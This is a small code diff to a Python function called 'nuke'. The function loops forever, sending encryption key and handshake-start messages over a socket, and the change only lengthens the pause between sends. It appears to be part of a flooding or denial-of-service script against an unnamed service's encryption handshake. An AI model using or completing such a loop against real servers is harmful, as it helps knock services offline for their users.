@@ -65,9 +65,9 @@ def nuke(meh):
             time.sleep(0.05)
             while True:
                 s.send(generate_message_encryptionpubkey())
-                time.sleep(0.1)
+                time.sleep(0.2)
                 s.send(generate_message_start_encryption())
-                time.sleep(0.1)
+                time.sleep(0.2)
             s.close()
         except ConnectionRefusedError:
             pass
